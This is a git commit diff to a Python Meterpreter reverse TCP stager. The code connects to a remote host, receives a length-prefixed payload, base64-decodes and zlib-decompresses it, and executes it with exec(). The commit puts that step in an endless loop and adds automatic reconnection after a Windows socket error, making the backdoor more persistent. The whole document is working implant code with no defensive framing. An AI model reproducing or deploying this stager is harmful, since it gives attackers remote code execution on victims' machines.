8004c2f77f400571a81f6205a39ee30764ddacd8
mustafa0s <70377466+ac2f@users.noreply.github.com>
2022-08-18 12:49:43 -0700

    Update python-meterpreter-reverse_tcp.py

--- python-meterpreter-reverse_tcp.py
+++ python-meterpreter-reverse_tcp.py
@@ -11,19 +11,21 @@ for x in range(10):
     except Exception as e:
         print(e)
         time.sleep(5)
-try:
-    l=struct.unpack('>I',s.recv(4))[0]
-    d=s.recv(l)
-    while len(d)<l:
-        d+=s.recv(l-len(d))
-    exec(zlib.decompress(base64.b64decode(d)),{'s':s})
-except Exception as e:
-    print("e2", str(e))
-    while True:
-        try:
-            s.connect((host.split(":")[0],int(host.split(":")[1])))
-            print("Connected")
-            break
-        except Exception as e:
-            print("e3", e)
-            time.sleep(5)
+while True:
+    try:
+        l=struct.unpack('>I',s.recv(4))[0]
+        d=s.recv(l)
+        while len(d)<l:
+            d+=s.recv(l-len(d))
+        exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+    except OSError as e:
+        if ("WinError 10057" in str(e)):
+            print("e2", str(e))
+            while True:
+                try:
+                    s.connect((host.split(":")[0],int(host.split(":")[1])))
+                    print("Connected")
+                    break
+                except Exception as e:
+                    print("e3", e)
+                    time.sleep(5)
